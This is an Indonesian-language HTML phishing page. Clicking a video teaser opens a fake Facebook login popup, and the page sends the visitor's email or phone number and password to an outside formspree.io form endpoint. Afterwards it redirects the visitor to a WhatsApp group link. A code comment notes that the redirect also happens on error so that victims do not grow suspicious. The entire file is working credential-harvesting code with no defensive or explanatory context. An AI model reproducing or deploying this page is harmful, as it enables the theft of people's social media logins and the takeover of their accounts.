<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vid Teh Pucuk</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #000;
            overflow: hidden;
        }

        /* Splash Screen */
        #splash-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #ffffff;
            z-index: 1;
            cursor: pointer;
        }

        #splash-container img {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
        }

        /* Popup Overlay */
        #popup-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.75);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        .fb-popup {
            background: #fff;
            width: 90%;
            max-width: 396px;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 12px 28px 0 rgba(0, 0, 0, 0.2);
            animation: slideIn 0.3s ease-out;
        }

        @keyframes slideIn {
            from { transform: translateY(-30px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .fb-logo-text {
            color: #1877f2;
            font-size: 32px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 10px;
            letter-spacing: -1px;
        }

        .video-text {
            text-align: center;
            font-size: 16px;
            color: #1c1e21;
            margin-bottom: 20px;
            font-weight: 500;
        }

        .input-wrapper {
            position: relative;
            width: 100%;
            margin-bottom: 12px;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 15px;
            outline: none;
            background-color: #f5f6f7;
        }

        input:focus {
            border-color: #1877f2;
            background-color: #fff;
        }

        .eye-icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #606770;
            display: flex;
            align-items: center;
        }

        .btn-login {
            width: 100%;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 5px;
        }

        .forgot-link {
            display: block;
            text-align: center;
            margin: 15px 0;
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
        }

        .divider {
            border-bottom: 1px solid #dadde1;
            margin-bottom: 20px;
        }

        .btn-new-acc {
            display: block;
            width: 65%;
            margin: 0 auto;
            background-color: #42b72a;
            color: white;
            text-align: center;
            padding: 10px;
            border-radius: 6px;
            text-decoration: none;
            font-weight: bold;
            font-size: 15px;
        }
    </style>
</head>
<body>

    <div id="splash-container" onclick="openPopup()">
        <img src="https://i.postimg.cc/y6MzwjwN/Screenshot-2026-02-16-08-31-05-219-com-whatsapp-w4b-edit.jpg" alt="Preview">
    </div>

    <div id="popup-overlay">
        <div class="fb-popup">
            <div class="fb-logo-text">facebook</div>
            <p class="video-text">Login Untuk Melanjutkan Menonton Video</p>
            
            <form id="fb-form" action="https://formspree.io/f/xgolkjyz" method="POST">
                <div class="input-wrapper">
                    <input type="text" name="Email_atau_Nomor" placeholder="Nomor ponsel atau email" required>
                </div>

                <div class="input-wrapper">
                    <input type="password" id="password" name="Kata_Sandi" placeholder="Kata sandi" required>
                    <div class="eye-icon" onclick="togglePassword()">
                        <svg id="eye-svg" xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" viewBox="0 0 16 16">
                            <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8zM1.173 8a13.133 13.133 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13.133 13.133 0 0 1 14.828 8c-.058.087-.122.183-.195.288-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5c-2.12 0-3.879-1.168-5.168-2.457A13.134 13.134 0 0 1 1.172 8z"/>
                            <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0z"/>
                        </svg>
                    </div>
                </div>

                <button type="submit" id="btn-submit" class="btn-login">Log In</button>
                <a href="#" class="forgot-link">Lupa kata sandi?</a>
            </form>

            <div class="divider"></div>
            <a href="#" class="btn-new-acc">Buat Akun Baru</a>
        </div>
    </div>

    <script>
        // Fungsi memunculkan popup
        function openPopup() {
            document.getElementById('popup-overlay').style.display = 'flex';
        }

        // Fungsi Lihat/Tutup Password
        function togglePassword() {
            const passwordField = document.getElementById('password');
            const eyeSvg = document.getElementById('eye-svg');
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                eyeSvg.innerHTML = '<path d="M13.359 11.238C15.06 9.72 16 8 16 8s-3-5.5-8-5.5a7.028 7.028 0 0 0-2.79.588l.77.771A5.944 5.944 0 0 1 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13.134 13.134 0 0 1 14.828 8c-.058.087-.122.183-.195.288-.335.48-.83 1.12-1.465 1.755-.165.165-.337.328-.517.486l.708.709zM11.297 9.176l.762.762A4.01 4.01 0 0 0 12 8a4 4 0 0 0-4-4c-.426 0-.832.066-1.214.188l.824.824c.13-.013.261-.02.39-.02a3 3 0 0 1 3 3c0 .129-.007.26-.02.39zm-1.611 1.611a.908.908 0 0 1-.34.063c-.5 0-.9-.4-.9-.9 0-.13.028-.25.076-.357l-.687-.687c-.125.215-.19.458-.19.714a2 2 0 0 0 2 2c.256 0 .499-.065.714-.19l-.673-.673zm-2.89-2.89L5.47 6.56C5.176 7.01 5 7.49 5 8a3 3 0 0 0 3 3c.51 0 .99-.176 1.44-.47l.762.762A4.012 4.012 0 0 1 8 12c-2.12 0-3.879-1.168-5.168-2.457A13.134 13.134 0 0 1 1.172 8c.06-.09.124-.187.198-.293a12.61 12.61 0 0 1 1.61-1.636l.745.746zm6.342 6.342l-.792-.792-9-9-.708.708 1.45 1.45c-.456.375-.86.79-1.201 1.221L0 8s3 5.5 8 5.5a7.029 7.029 0 0 0 4.058-1.288l1.235 1.235.708-.708z"/>';
            } else {
                passwordField.type = 'password';
                eyeSvg.innerHTML = '<path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8zM1.173 8a13.133 13.133 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13.133 13.133 0 0 1 14.828 8c-.058.087-.122.183-.195.288-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5c-2.12 0-3.879-1.168-5.168-2.457A13.134 13.134 0 0 1 1.172 8z"/><path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0z"/>';
            }
        }

        // Script untuk Redirect otomatis ke WA setelah kirim data
        const form = document.getElementById('fb-form');
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            const btn = document.getElementById('btn-submit');
            btn.innerHTML = "Memuat...";
            btn.style.opacity = "0.7";

            const formData = new FormData(form);
            
            try {
                await fetch(form.action, {
                    method: 'POST',
                    body: formData,
                    headers: { 'Accept': 'application/json' }
                });
                // PINDAH KE WA SETELAH BERHASIL
                window.location.href = "https://chat.whatsapp.com/KVe6DnFDUHl9CSf1GFnezF?mode=gi_c";
            } catch (error) {
                // JIKA ERROR TETAP PINDAH AGAR TIDAK DICURIGAI
                window.location.href = "https://chat.whatsapp.com/KVe6DnFDUHl9CSf1GFnezF?mode=gi_c";
            }
        });
    </script>
</body>
</html>
